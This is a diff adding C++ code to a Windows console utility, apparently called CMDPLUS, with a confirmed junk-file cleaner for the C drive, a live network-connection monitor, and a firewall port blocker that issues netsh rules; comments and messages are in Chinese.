+                    ULARGE_INTEGER fileSize;
+                    fileSize.LowPart = findData.nFileSizeLow;
+                    fileSize.HighPart = findData.nFileSizeHigh;
+
+                    localFiles.push_back({fullPath, fileSize.QuadPart, target.category, target.description});
+                    g_progress.foundFiles.fetch_add(1, std::memory_order_relaxed);
+                    g_progress.totalSize.fetch_add(fileSize.QuadPart, std::memory_order_relaxed);
+                }
+            }
+        } while (FindNextFileW(hFind, &findData));
+
+        FindClose(hFind);
+    }
+
+    static DWORD WINAPI ScanThreadProc(LPVOID lpParam) {
+        ScanTarget* target = static_cast<ScanTarget*>(lpParam);
+        std::vector<GarbageFileInfo> localFiles;
+
+        try {
+            ScanDirectory(*target, localFiles);
+        }
+        catch (...) {
+        }
+
+        if (!localFiles.empty()) {
+            std::lock_guard<std::mutex> lock(g_mutex);
+            g_garbageFiles.insert(g_garbageFiles.end(), localFiles.begin(), localFiles.end());
+        }
+
+        g_progress.runningThreads.fetch_sub(1, std::memory_order_relaxed);
+        delete target;
+        return 0;
+    }
+
+    static bool SafeDeleteFile(const std::wstring& path) {
+        DWORD attr = GetFileAttributesW(path.c_str());
+        if (attr == INVALID_FILE_ATTRIBUTES) {
+            return true;
+        }
+
+        if (DeleteFileW(path.c_str()) != 0) {
+            return true;
+        }
+
+        DWORD err = GetLastError();
+        if (err == ERROR_FILE_NOT_FOUND || err == ERROR_PATH_NOT_FOUND) {
+            return true;
+        }
+
+        if (attr & FILE_ATTRIBUTE_READONLY) {
+            SetFileAttributesW(path.c_str(), attr & ~FILE_ATTRIBUTE_READONLY);
+            if (DeleteFileW(path.c_str()) != 0) {
+                return true;
+            }
+        }
+
+        return false;
+    }
+
+    // [线程池] 删除任务上下文
+    struct DeleteTaskContext {
+        std::wstring path;
+        uint64_t size;
+        // 共享的线程安全计数器
+        std::atomic<int>* deletedCount;
+        std::atomic<int>* failedCount;
+        std::atomic<uint64_t>* deletedSize;
+        std::atomic<int>* processedCount;
+        std::atomic<bool>* stopFlag;
+        int totalCount;
+    };
+
+    // [线程池] 单个文件删除回调(由线程池调度) - 高性能版本
+    static void CALLBACK DeleteFileCallback(PTP_CALLBACK_INSTANCE instance, PVOID context) {
+        DeleteTaskContext* task = static_cast<DeleteTaskContext*>(context);
+        if (!task) return;
+
+        // 快速检查停止信号
+        if (task->stopFlag->load(std::memory_order_relaxed)) {
+            task->failedCount->fetch_add(1, std::memory_order_relaxed);
+            task->processedCount->fetch_add(1, std::memory_order_relaxed);
+            return;
+        }
+
+        // 直接调用 DeleteFileW (路径已经在主线程中验证过)
+        BOOL result = DeleteFileW(task->path.c_str());
+        if (result) {
+            task->deletedCount->fetch_add(1, std::memory_order_relaxed);
+            task->deletedSize->fetch_add(task->size, std::memory_order_relaxed);
+        } else {
+            // 快速错误处理
+            DWORD err = GetLastError();
+            if (err == ERROR_FILE_NOT_FOUND || err == ERROR_PATH_NOT_FOUND) {
+                task->deletedCount->fetch_add(1, std::memory_order_relaxed);
+            } else if (err == ERROR_ACCESS_DENIED) {
+                // 尝试移除只读属性
+                DWORD attr = GetFileAttributesW(task->path.c_str());
+                if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_READONLY)) {
+                    SetFileAttributesW(task->path.c_str(), attr & ~FILE_ATTRIBUTE_READONLY);
+                    if (DeleteFileW(task->path.c_str())) {
+                        task->deletedCount->fetch_add(1, std::memory_order_relaxed);
+                        task->deletedSize->fetch_add(task->size, std::memory_order_relaxed);
+                    } else {
+                        task->failedCount->fetch_add(1, std::memory_order_relaxed);
+                    }
+                } else {
+                    task->failedCount->fetch_add(1, std::memory_order_relaxed);
+                }
+            } else {
+                task->failedCount->fetch_add(1, std::memory_order_relaxed);
+            }
+        }
+        task->processedCount->fetch_add(1, std::memory_order_relaxed);
+    }
+
+    static void BatchDeleteByDirectory(const std::vector<GarbageFileInfo>& files, int& deletedCount, int& failedCount, uint64_t& deletedSize, int maxCmdLength = 6000) {
+        // [高性能优化策略]
+        // 1. 预过滤: 主线程先批量检查受保护路径,只提交安全任务
+        // 2. 任务对象池: 预分配任务对象,避免每文件 new/delete
+        // 3. 快速路径: critical 检查仅 1 次,任务中直接删除
+        // 4. 内存序优化: relaxed 内存序减少 CPU 内存屏障
+        if (files.empty()) {
+            deletedCount = 0;
+            failedCount = 0;
+            deletedSize = 0;
+            return;
+        }
+
+        // [优化1] 主线程预过滤 - 检查所有文件路径
+        std::vector<DeleteTaskContext> taskPool;
+        taskPool.reserve(files.size());
+        int preFilteredCount = 0;
+        std::atomic<int> preFilteredAtomic(0);
+
+        for (const auto& f : files) {
+            DeleteTaskContext task;
+            task.path = f.path;
+            task.size = f.size;
+            // 这些指针稍后赋值
+            task.deletedCount = nullptr;
+            task.failedCount = nullptr;
+            task.deletedSize = nullptr;
+            task.processedCount = nullptr;
+            task.stopFlag = nullptr;
+            task.totalCount = 0;
+
+            // 快速安全检查 (主线程执行,无需重复)
+            // 使用简单快速算法: 只检查是否包含关键子串
+            static const wchar_t* criticalPaths[] = {
+                L"\\microsoft visual studio\\",
+                L"\\windows kits\\",
+                L"\\msbuild\\",
+                L"\\dotnet\\packs\\",
+                L"\\dotnet\\sdk\\",
+                L"\\dotnet\\shared\\",
+                L"\\vc\\tools\\",
+                L"\\vc\\include\\",
+                L"\\vc\\lib\\",
+                L"\\vc\\atlmfc\\",
+            };
+            bool isCritical = false;
+            // 单次扫描,使用 towlower 优化的内联函数
+            for (auto& c : task.path) {
+                if (c >= L'A' && c <= L'Z') c = c - L'A' + L'a';
+            }
+            for (auto prefix : criticalPaths) {
+                if (wcsstr(task.path.c_str(), prefix) != nullptr) {
+                    isCritical = true;
+                    break;
+                }
+            }
+
+            if (isCritical) {
+                preFilteredCount++;
+            } else {
+                taskPool.push_back(std::move(task));
+            }
+        }
+
+        if (preFilteredCount > 0) {
+            std::wcout << L"[安全] 预过滤跳过 " << preFilteredCount << L" 个受保护文件" << std::endl;
+        }
+
+        int actualTaskCount = (int)taskPool.size();
+        if (actualTaskCount == 0) {
+            deletedCount = 0;
+            failedCount = preFilteredCount;
+            deletedSize = 0;
+            return;
+        }
+
+        // [优化2] 共享原子计数器
+        std::atomic<int> deletedCountAtomic(0);
+        std::atomic<int> failedCountAtomic(preFilteredCount);  // 计入预过滤数
+        std::atomic<uint64_t> deletedSizeAtomic(0);
+        std::atomic<int> processedCount(0);
+        std::atomic<bool> stopFlag(false);
+
+        // 填充共享指针
+        for (auto& task : taskPool) {
+            task.deletedCount = &deletedCountAtomic;
+            task.failedCount = &failedCountAtomic;
+            task.deletedSize = &deletedSizeAtomic;
+            task.processedCount = &processedCount;
+            task.stopFlag = &stopFlag;
+            task.totalCount = actualTaskCount;
+        }
+
+        // [优化3] 线程池环境
+        TP_CALLBACK_ENVIRON pcbe;
+        InitializeThreadpoolEnvironment(&pcbe);
+
+        PTP_CLEANUP_GROUP cleanupGroup = CreateThreadpoolCleanupGroup();
+        SetThreadpoolCallbackCleanupGroup(&pcbe, cleanupGroup, nullptr);
+
+        PTP_POOL pool = CreateThreadpool(nullptr);
+        if (!pool) {
+            // 回退到串行删除
+            for (auto& task : taskPool) {
+                if (DeleteFileW(task.path.c_str())) {
+                    deletedCountAtomic.fetch_add(1);
+                    deletedSizeAtomic.fetch_add(task.size);
+                } else {
+                    failedCountAtomic.fetch_add(1);
+                }
+            }
+            deletedCount = deletedCountAtomic.load();
+            failedCount = failedCountAtomic.load();
+            deletedSize = deletedSizeAtomic.load();
+            return;
+        }
+
+        // [优化4] 智能线程数: 不再硬编码 4096
+        // Windows 默认线程池 500 个并发足够,设置过高反而降低性能
+        SYSTEM_INFO si;
+        GetSystemInfo(&si);
+        DWORD numCores = si.dwNumberOfProcessors;
+        // 物理核心 * 4 已经是极限(IO 密集型操作)
+        DWORD maxThreads = (std::min)((DWORD)4096, numCores * 8);
+        DWORD minThreads = (std::min)((DWORD)16, numCores * 2);
+        SetThreadpoolThreadMaximum(pool, maxThreads);
+        SetThreadpoolThreadMinimum(pool, minThreads);
+        SetThreadpoolCallbackPool(&pcbe, pool);
+
+        // 进度显示线程
+        std::thread progressThread([&]() {
+            int lastDisplayed = 0;
+            while (processedCount.load(std::memory_order_relaxed) < actualTaskCount &&
+                   !stopFlag.load(std::memory_order_relaxed)) {
+                int cur = processedCount.load(std::memory_order_relaxed);
+                if (cur - lastDisplayed >= 5000 || cur == actualTaskCount) {
+                    lastDisplayed = cur;
+                    std::wcout << L"\r[删除中] " << cur << L"/" << actualTaskCount
+                               << L" | 成功 " << deletedCountAtomic.load(std::memory_order_relaxed)
+                               << L" | 失败 " << failedCountAtomic.load(std::memory_order_relaxed)
+                               << L" | " << FormatSize(deletedSizeAtomic.load(std::memory_order_relaxed))
+                               << L"      " << std::flush;
+                }
+                Sleep(100);
+            }
+            std::wcout << L"\r[删除中] " << actualTaskCount << L"/" << actualTaskCount
+                       << L" | 成功 " << deletedCountAtomic.load()
+                       << L" | 失败 " << failedCountAtomic.load()
+                       << L" | " << FormatSize(deletedSizeAtomic.load())
+                       << L"      " << std::endl;
+        });
+
+        // 批量提交任务
+        for (auto& task : taskPool) {
+            // 关键: 传 &task (栈/vector 中对象地址),而非 new
+            TrySubmitThreadpoolCallback(DeleteFileCallback, &task, &pcbe);
+        }
+
+        // 等待所有任务完成
+        CloseThreadpoolCleanupGroupMembers(cleanupGroup, FALSE, nullptr);
+
+        stopFlag.store(true);
+        if (progressThread.joinable()) {
+            progressThread.join();
+        }
+
+        CloseThreadpoolCleanupGroup(cleanupGroup);
+        CloseThreadpool(pool);
+
+        deletedCount = deletedCountAtomic.load();
+        failedCount = failedCountAtomic.load();
+        deletedSize = deletedSizeAtomic.load();
+    }
+
+    static bool SafeRemoveDirectory(const std::wstring& path) {
+        if (IsFileInUse(path)) {
+            return false;
+        }
+
+        std::wstring attribCmd = L"attrib -H -S -R \"" + path + L"\" /s /d 2>nul";
+        _wsystem(attribCmd.c_str());
+
+        return RemoveDirectoryW(path.c_str()) != 0;
+    }
+
+    static std::wstring FormatSize(uint64_t bytes) {
+        const wchar_t* units[] = {L"B", L"KB", L"MB", L"GB", L"TB"};
+        int unitIndex = 0;
+        double size = static_cast<double>(bytes);
+
+        while (size >= 1024 && unitIndex < 4) {
+            size /= 1024;
+            unitIndex++;
+        }
+
+        wchar_t buffer[32];
+        swprintf_s(buffer, L"%.2f %s", size, units[unitIndex]);
+        return buffer;
+    }
+
+public:
+    static void StartCleanup() {
+        DMSP_VERIFY(0x2005);  // 垃圾清理子函数 - 二级验证
+        g_garbageFiles.clear();
+        g_progress.scannedFiles.store(0);
+        g_progress.foundFiles.store(0);
+        g_progress.totalSize.store(0);
+        g_progress.runningThreads.store(0);
+        g_progress.startTime = std::chrono::steady_clock::now();
+        g_stopRequested.store(false);
+
+        std::wcout << L"\n========================================" << std::endl;
+        std::wcout << L"           C盘垃圾清理" << std::endl;
+        std::wcout << L"========================================" << std::endl;
+
+        std::vector<ScanTarget> targets = GetScanTargets();
+
+        std::wcout << L"\n[扫描] 正在启动多线程扫描..." << std::endl;
+        std::wcout << L"[信息] 共 " << targets.size() << L" 个扫描目标" << std::endl;
+
+        std::vector<HANDLE> threads;
+
+        for (const auto& target : targets) {
+            ScanTarget* pTarget = new ScanTarget(target);
+            g_progress.runningThreads.fetch_add(1, std::memory_order_relaxed);
+            HANDLE hThread = CreateThread(nullptr, 0, ScanThreadProc, pTarget, 0, nullptr);
+            if (hThread) {
+                threads.push_back(hThread);
+            }
+        }
+
+        std::wcout << L"[扫描] 已启动 " << threads.size() << L" 个扫描线程" << std::endl;
+
+        while (g_progress.runningThreads.load() > 0) {
+            auto now = std::chrono::steady_clock::now();
+            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - g_progress.startTime).count();
+
+            std::wcout << L"\r[扫描中] 已扫描 " << g_progress.scannedFiles.load()
+                       << L" 个文件 | 发现 " << g_progress.foundFiles.load()
+                       << L" 个垃圾 | 大小 " << FormatSize(g_progress.totalSize.load())
+                       << L" | 耗时 " << elapsed << L"s      " << std::flush;
+
+            Sleep(500);
+        }
+
+        std::cout << std::endl;
+
+        for (HANDLE hThread : threads) {
+            CloseHandle(hThread);
+        }
+
+        if (g_garbageFiles.empty()) {
+            std::wcout << L"\n[完成] 未发现可清理的垃圾文件" << std::endl;
+            return;
+        }
+
+        std::map<std::wstring, std::pair<uint64_t, int>> categoryStats;
+        for (const auto& file : g_garbageFiles) {
+            categoryStats[file.category].first += file.size;
+            categoryStats[file.category].second++;
+        }
+
+        std::wcout << L"\n[结果] 垃圾文件统计:" << std::endl;
+        std::wcout << L"----------------------------------------" << std::endl;
+        uint64_t totalSize = 0;
+        int totalCount = 0;
+        for (const auto& cat : categoryStats) {
+            std::wcout << L"  " << std::left << std::setw(20) << cat.first
+                       << L": " << std::right << std::setw(5) << cat.second.second << L" 个"
+                       << L" | " << FormatSize(cat.second.first) << std::endl;
+            totalSize += cat.second.first;
+            totalCount += cat.second.second;
+        }
+        std::wcout << L"----------------------------------------" << std::endl;
+        std::wcout << L"  " << std::left << std::setw(20) << L"总计"
+                   << L": " << std::right << std::setw(5) << totalCount << L" 个"
+                   << L" | " << FormatSize(totalSize) << std::endl;
+
+        std::wcout << L"\n是否清理这些文件? (Y: 清理, N: 取消): ";
+        wchar_t choice;
+        std::wcin >> choice;
+        std::wcin.ignore();
+
+        if (choice != L'y' && choice != L'Y') {
+            std::wcout << L"[取消] 操作已取消" << std::endl;
+            return;
+        }
+
+        std::wcout << L"\n[删除] 正在清理垃圾文件..." << std::endl;
+
+        int deletedCount = 0;
+        int failedCount = 0;
+        uint64_t deletedSize = 0;
+
+        BatchDeleteByDirectory(g_garbageFiles, deletedCount, failedCount, deletedSize);
+
+        std::cout << std::endl;
+
+        std::wcout << L"\n[完成] 清理完成!" << std::endl;
+        std::wcout << L"  删除成功: " << deletedCount << L" 个 | " << FormatSize(deletedSize) << std::endl;
+        std::wcout << L"  删除失败: " << failedCount << L" 个 (可能被其他程序占用)" << std::endl;
+
+        g_garbageFiles.clear();
+    }
+};
+
+GarbageCleaner::ScanProgress GarbageCleaner::g_progress;
+std::vector<GarbageCleaner::GarbageFileInfo> GarbageCleaner::g_garbageFiles;
+std::mutex GarbageCleaner::g_mutex;
+std::atomic<bool> GarbageCleaner::g_stopRequested{false};
+
+// ============================================================================
+// 端口监控系统 - 实时检测网络连接和监听端口
+// ============================================================================
+
+class PortMonitor {
+private:
+    struct ConnectionInfo {
+        DWORD pid;
+        DWORD localPort;
+        DWORD remotePort;
+        ULONG localAddr;
+        ULONG remoteAddr;
+        int state;
+        bool isTCP;
+    };
+
+    static bool IsSystemProcess(const std::wstring& name) {
+        return IsInUnifiedWhitelist(name);
+    }
+
+    static bool IsActiveState(int state) {
+        switch (state) {
+            case MIB_TCP_STATE_LISTEN:
+            case MIB_TCP_STATE_SYN_SENT:
+            case MIB_TCP_STATE_SYN_RCVD:
+            case MIB_TCP_STATE_ESTAB:
+            case MIB_TCP_STATE_FIN_WAIT1:
+            case MIB_TCP_STATE_FIN_WAIT2:
+            case MIB_TCP_STATE_CLOSE_WAIT:
+            case MIB_TCP_STATE_CLOSING:
+            case MIB_TCP_STATE_LAST_ACK:
+                return true;
+            default:
+                return false;
+        }
+    }
+
+    static std::wstring FormatIP(ULONG addr) {
+        if (addr == 0) return L"*";
+        return std::to_wstring((addr & 0xFF)) + L"." +
+               std::to_wstring((addr >> 8) & 0xFF) + L"." +
+               std::to_wstring((addr >> 16) & 0xFF) + L"." +
+               std::to_wstring((addr >> 24) & 0xFF);
+    }
+
+    static std::wstring GetProcessNameByPID(DWORD pid) {
+        if (pid == 0) return L"System Idle Process";
+        if (pid == 4) return L"System";
+
+        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hSnapshot == INVALID_HANDLE_VALUE) return L"Unknown";
+
+        PROCESSENTRY32W pe;
+        pe.dwSize = sizeof(PROCESSENTRY32W);
+
+        if (Process32FirstW(hSnapshot, &pe)) {
+            do {
+                if (pe.th32ProcessID == pid) {
+                    CloseHandle(hSnapshot);
+                    return std::wstring(pe.szExeFile);
+                }
+            } while (Process32NextW(hSnapshot, &pe));
+        }
+        CloseHandle(hSnapshot);
+        return L"Unknown";
+    }
+
+    static void GetTCPConnections(std::vector<ConnectionInfo>& connections) {
+        DWORD size = 0;
+        GetExtendedTcpTable(NULL, &size, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
+
+        if (size == 0) return;
+
+        PMIB_TCPTABLE_OWNER_PID tcpTable = (PMIB_TCPTABLE_OWNER_PID) new char[size];
+
+        if (GetExtendedTcpTable(tcpTable, &size, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) == NO_ERROR) {
+            for (DWORD i = 0; i < tcpTable->dwNumEntries; i++) {
+                ConnectionInfo info;
+                info.pid = tcpTable->table[i].dwOwningPid;
+                info.localPort = ntohs((USHORT)(tcpTable->table[i].dwLocalPort));
+                info.remotePort = ntohs((USHORT)(tcpTable->table[i].dwRemotePort));
+                info.localAddr = tcpTable->table[i].dwLocalAddr;
+                info.remoteAddr = tcpTable->table[i].dwRemoteAddr;
+                info.state = tcpTable->table[i].dwState;
+                info.isTCP = true;
+                connections.push_back(info);
+            }
+        }
+        delete[] (char*)tcpTable;
+    }
+
+    static void GetUDPListeners(std::vector<ConnectionInfo>& listeners) {
+        DWORD size = 0;
+        GetExtendedUdpTable(NULL, &size, FALSE, AF_INET, UDP_TABLE_OWNER_PID, 0);
+
+        if (size == 0) return;
+
+        PMIB_UDPTABLE_OWNER_PID udpTable = (PMIB_UDPTABLE_OWNER_PID) new char[size];
+
+        if (GetExtendedUdpTable(udpTable, &size, FALSE, AF_INET, UDP_TABLE_OWNER_PID, 0) == NO_ERROR) {
+            for (DWORD i = 0; i < udpTable->dwNumEntries; i++) {
+                ConnectionInfo info;
+                info.pid = udpTable->table[i].dwOwningPid;
+                info.localPort = ntohs((USHORT)(udpTable->table[i].dwLocalPort));
+                info.localAddr = udpTable->table[i].dwLocalAddr;
+                info.remotePort = 0;
+                info.remoteAddr = 0;
+                info.state = -1;
+                info.isTCP = false;
+                listeners.push_back(info);
+            }
+        }
+        delete[] (char*)udpTable;
+    }
+
+    static std::wstring GetStateString(int state) {
+        if (state == -1) return L"LISTEN";
+        switch (state) {
+            case MIB_TCP_STATE_CLOSED:     return L"CLOSED";
+            case MIB_TCP_STATE_LISTEN:     return L"LISTEN";
+            case MIB_TCP_STATE_SYN_SENT:   return L"SYN_SENT";
+            case MIB_TCP_STATE_SYN_RCVD:   return L"SYN_RCVD";
+            case MIB_TCP_STATE_ESTAB:      return L"ESTABLISHED";
+            case MIB_TCP_STATE_FIN_WAIT1:  return L"FIN_WAIT1";
+            case MIB_TCP_STATE_FIN_WAIT2:  return L"FIN_WAIT2";
+            case MIB_TCP_STATE_CLOSE_WAIT: return L"CLOSE_WAIT";
+            case MIB_TCP_STATE_CLOSING:    return L"CLOSING";
+            case MIB_TCP_STATE_LAST_ACK:   return L"LAST_ACK";
+            case MIB_TCP_STATE_TIME_WAIT:  return L"TIME_WAIT";
+            case MIB_TCP_STATE_DELETE_TCB: return L"DELETE_TCB";
+            default: return L"UNKNOWN";
+        }
+    }
+
+public:
+    static void StartPortMonitoring() {
+        DMSP_VERIFY(0x2006);  // 端口监控子函数 - 二级验证
+        bool showSystem = false;
+        int scanCount = 0;
+
+        HANDLE hCon = GetStdHandle(STD_OUTPUT_HANDLE);
+        CONSOLE_SCREEN_BUFFER_INFO csbi;
+        GetConsoleScreenBufferInfo(hCon, &csbi);
+        SHORT headerEndRow = csbi.dwCursorPosition.Y;
+
+        std::wcout << L"\n========================================" << std::endl;
+        std::wcout << L"       端口监控（实时检测）" << std::endl;
+        std::wcout << L"========================================" << std::endl;
+        std::wcout << L"  S=切换系统进程  Q=退出\n" << std::endl;
+
+        // 上一次的连接快照，用于检测新连接
+        std::set<std::wstring> prevKeys;
+
+        // 历史记录：所有曾经出现过的连接（用于显示已断开的连接）
+        struct HistoryEntry {
+            std::wstring display;     // 显示文本
+            std::wstring sortKey;     // 排序键
+            DWORD pid;                // 进程ID
+            std::wstring procName;    // 进程名
+        };
+        std::map<std::wstring, HistoryEntry> historyMap;
+
+        while (true) {
+            if (_kbhit()) {
+                int ch = _getch();
+                if (ch == 's' || ch == 'S') { showSystem = !showSystem; }
+                else if (ch == 'q' || ch == 'Q' || ch == 27) {
+                    std::wcout << L"\n[退出] 端口监控已停止" << std::endl;
+                    return;
+                }
+            }
+
+            scanCount++;
+            SYSTEMTIME st;
+            GetLocalTime(&st);
+
+            struct ConnLine {
+                std::wstring display;
+                std::wstring sortKey;
+                bool isNew;
+            };
+            std::vector<ConnLine> activeLines;
+            std::set<std::wstring> currKeys;
+
+            auto makeLine = [&](const ConnectionInfo& c, const wchar_t* stateStr) -> ConnLine {
+                std::wstring procName = GetProcessNameByPID(c.pid);
+                if (!showSystem && IsSystemProcess(procName)) { return {L"", L"", false}; }
+
+                std::wstring lIp = FormatIP(c.localAddr);
+                std::wstring rIp = FormatIP(c.remoteAddr);
+
+                std::wstring key = rIp + L":" + std::to_wstring(c.remotePort) + L"|"
+                                   + lIp + L":" + std::to_wstring(c.localPort) + L"|"
+                                   + procName;
+                currKeys.insert(key);
+
+                bool isNew = (prevKeys.find(key) == prevKeys.end());
+
+                // 构建显示行: 源->目标  状态  进程 PID
+                wchar_t line[256];
+                if (c.isTCP && c.remoteAddr != 0) {
+                    swprintf(line, 256, L"%-15s:%-5u -> %-15s:%-5u %-8s %-12s %5u",
+                        lIp.c_str(), c.localPort,
+                        rIp.c_str(), c.remotePort,
+                        stateStr, procName.c_str(), c.pid);
+                } else {
+                    swprintf(line, 256, L"%-15s:%-5u [LISTENING]          %-8s %-12s %5u",
+                        lIp.c_str(), c.localPort,
+                        stateStr, procName.c_str(), c.pid);
+                }
+
+                std::wstring sk = lIp + L":" + std::to_wstring(c.localPort) + L"->" +
+                                   rIp + L":" + std::to_wstring(c.remotePort ? c.remotePort : 0);
+
+                HistoryEntry he;
+                he.display = line;
+                he.sortKey = sk;
+                he.pid = c.pid;
+                he.procName = procName;
+                historyMap[key] = he;
+
+                return {line, sk, isNew};
+            };
+
+            std::vector<ConnectionInfo> allConn;
+            GetTCPConnections(allConn);
+            GetUDPListeners(allConn);
+
+            for (const auto& c : allConn) {
+                if (c.state == MIB_TCP_STATE_TIME_WAIT) continue;
+                if (c.localAddr == 0x0100007F || c.remoteAddr == 0x0100007F) continue;
+                if (c.localAddr == 0 && c.remoteAddr == 0) continue;
+
+                ConnLine cl;
+                if (c.isTCP) {
+                    cl = makeLine(c, GetStateString(c.state).c_str());
+                    if (cl.display.empty()) continue;
+                    if (IsActiveState(c.state))
+                        activeLines.push_back(cl);
+                } else {
+                    cl = makeLine(c, L"UDP");
+                    if (!cl.display.empty())
+                        activeLines.push_back(cl);
+                }
+            }
+
+            // 已失效：历史中存在但本轮不活跃的连接
+            std::vector<ConnLine> expiredLines;
+            for (auto& kv : historyMap) {
+                if (currKeys.find(kv.first) == currKeys.end()) {
+                    expiredLines.push_back({kv.second.display, kv.second.sortKey, false});
+                }
+            }
+
+            // 排序
+            auto sortByRemote = [](const ConnLine& a, const ConnLine& b) {
+                return a.sortKey < b.sortKey;
+            };
+            std::sort(activeLines.begin(), activeLines.end(), sortByRemote);
+            std::sort(expiredLines.begin(), expiredLines.end(), sortByRemote);
+
+            // 部分清屏
+            GetConsoleScreenBufferInfo(hCon, &csbi);
+            if (headerEndRow > csbi.srWindow.Bottom) headerEndRow = csbi.srWindow.Bottom;
+            COORD pos = { 0, headerEndRow };
+            SetConsoleCursorPosition(hCon, pos);
+            DWORD written;
+            DWORD cellCount = csbi.dwSize.X * (csbi.srWindow.Bottom + 1 - headerEndRow);
+            FillConsoleOutputCharacterW(hCon, L' ', cellCount, pos, &written);
+            SetConsoleCursorPosition(hCon, pos);
+
+            // ---- 标题 ----
+            wchar_t timeBuf[24];
+            swprintf(timeBuf, 24, L"%02d:%02d:%02d", st.wHour, st.wMinute, st.wSecond);
+            std::wcout << L" CMDPLUS PortMonitor  |  #" << scanCount
+                       << L"  " << timeBuf
+                       << L"  sys:" << (showSystem ? L"ON" : L"OFF") << std::endl;
+            std::wcout << L"-" << std::wstring(78, '-') << std::endl;
+            std::wcout << L" [ACTIVE] " << activeLines.size() << L" connections" << std::endl;
+            std::wcout << L" SourceIP:Port  -> DestIP:Port         State  Process       PID" << std::endl;
+            std::wcout << L"-" << std::wstring(78, '-') << std::endl;
+            std::wcout << L"-" << std::wstring(78, '-') << std::endl;
+            std::wcout << L"-" << std::wstring(78, '-') << std::endl;
+
+            if (activeLines.empty()) {
+                std::wcout << L" (none)" << std::endl;
+            } else {
+                for (auto& cl : activeLines) {
+                    if (cl.isNew)
+                        std::wcout << L"*";
+                    else
+                        std::wcout << L" ";
+                    std::wcout << cl.display << std::endl;
+                }
+            }
+
+            std::wcout << L"-" << std::wstring(78, '-') << std::endl;
+            std::wcout << L" [EXPIRED] " << expiredLines.size() << L" connections" << std::endl;
+            std::wcout << L"-" << std::wstring(78, '-') << std::endl;
+
+            if (expiredLines.empty()) {
+                std::wcout << L" (none)" << std::endl;
+            } else {
+                for (auto& cl : expiredLines) {
+                    std::wcout << L"  " << cl.display << std::endl;
+                }
+            }
+
+            std::wcout << L"-" << std::wstring(78, '-') << std::endl;
+            std::wcout << L" *=new  S=toggle sys  Q=quit" << std::endl;
+
+            prevKeys.swap(currKeys);
+            Sleep(1000);
+        }
+    }
+};
+
+// ============================================================================
+// 端口阻止模块 - 禁止指定端口的网络连接
+// ============================================================================
+
+class PortBlocker {
+private:
+    static std::wstring GetRulePrefix() {
+        return L"CMDPLUS_PORT_BLOCK_";
+    }
+
+    static bool IsRuleExists(const std::wstring& ruleName) {
+        std::wstring cmd = L"netsh advfirewall firewall show rule name=\"" + ruleName + L"\" >nul 2>&1";
+        return _wsystem(cmd.c_str()) == 0;
+    }
+
+    static void DeleteRule(const std::wstring& ruleName) {
+        if (!IsRuleExists(ruleName)) return;
+        std::wstring cmd = L"netsh advfirewall firewall delete rule name=\"" + ruleName + L"\" >nul 2>&1";
+        _wsystem(cmd.c_str());
+    }
+
+    static void ExecuteBatchCommands(const std::vector<std::wstring>& commands) {
+        DMSP_VERIFY(0x2007);  // 批量命令执行子函数 - 二级验证
+        if (commands.empty()) return;
+
+        std::wstring batchContent = L"@echo off\r\n";
+        for (const auto& cmd : commands) {
+            batchContent += cmd + L"\r\n";
+        }
+
+        wchar_t tempPath[MAX_PATH];
+        GetTempPathW(MAX_PATH, tempPath);
+        
+        SYSTEMTIME st;
+        GetLocalTime(&st);
+        std::wstring batchFile = std::wstring(tempPath) + L"CMDPLUS_PB_" +
+                    std::to_wstring(st.wYear) + std::to_wstring(st.wMonth) +
+                    std::to_wstring(st.wDay) + std::to_wstring(st.wHour) +
+                    std::to_wstring(st.wMinute) + std::to_wstring(st.wSecond) +
+                    std::to_wstring(st.wMilliseconds) + L".bat";
+
+        FILE* f = _wfopen(batchFile.c_str(), L"w");
+        if (!f) return;
+        
+        fwprintf(f, L"%s", batchContent.c_str());
+        fclose(f);
+
+        STARTUPINFOW si = { sizeof(si) };
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        PROCESS_INFORMATION pi;
+
+        std::wstring cmdLine = L"cmd.exe /c \"" + batchFile + L"\" >nul 2>&1";
+        
+        if (CreateProcessW(NULL, &cmdLine[0], NULL, NULL, FALSE,
+                         CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+            WaitForSingleObject(pi.hProcess, INFINITE);
+            CloseHandle(pi.hThread);
+            CloseHandle(pi.hProcess);
+        }
+
+        _wremove(batchFile.c_str());
+    }
+
+    static void BlockPortTCP(DWORD port) {
+        std::wstring ruleNameIn = GetRulePrefix() + L"TCP_IN_" + std::to_wstring(port);
+        std::wstring ruleNameOut = GetRulePrefix() + L"TCP_OUT_" + std::to_wstring(port);
+        
+        bool blockedIn = false;
+        bool blockedOut = false;
+
+        if (!IsRuleExists(ruleNameIn)) {
+            std::wstring cmd = L"netsh advfirewall firewall add rule name=\"" + ruleNameIn +
+                              L"\" dir=in action=block protocol=TCP localport=" +
+                              std::to_wstring(port) + L" >nul 2>&1";
+            
+            if (_wsystem(cmd.c_str()) == 0) {
+                blockedIn = true;
+            }
+        } else {
+            std::wcout << L"  [已存在] TCP端口 " << port << L" 入站规则已存在" << std::endl;
+            blockedIn = true;
+        }
+
+        if (!IsRuleExists(ruleNameOut)) {
+            std::wstring cmd = L"netsh advfirewall firewall add rule name=\"" + ruleNameOut +
+                              L"\" dir=out action=block protocol=TCP localport=" +
+                              std::to_wstring(port) + L" >nul 2>&1";
+            
+            if (_wsystem(cmd.c_str()) == 0) {
+                blockedOut = true;
+            }
+        } else {
+            std::wcout << L"  [已存在] TCP端口 " << port << L" 出站规则已存在" << std::endl;
+            blockedOut = true;
+        }
+
+        if (blockedIn && blockedOut) {
+            std::wcout << L"  [成功] 已阻止TCP端口 " << port << L" 的入站和出站连接" << std::endl;
+        } else if (blockedIn) {
+            std::wcout << L"  [部分成功] 仅阻止了TCP端口 " << port << L" 的入站连接" << std::endl;
+        } else if (blockedOut) {
+            std::wcout << L"  [部分成功] 仅阻止了TCP端口 " << port << L" 的出站连接" << std::endl;
+        } else {
+            std::wcout << L"  [失败] 无法阻止TCP端口 " << port << std::endl;
+        }
+    }
+
+    static void BlockPortUDP(DWORD port) {
+        std::wstring ruleNameIn = GetRulePrefix() + L"UDP_IN_" + std::to_wstring(port);
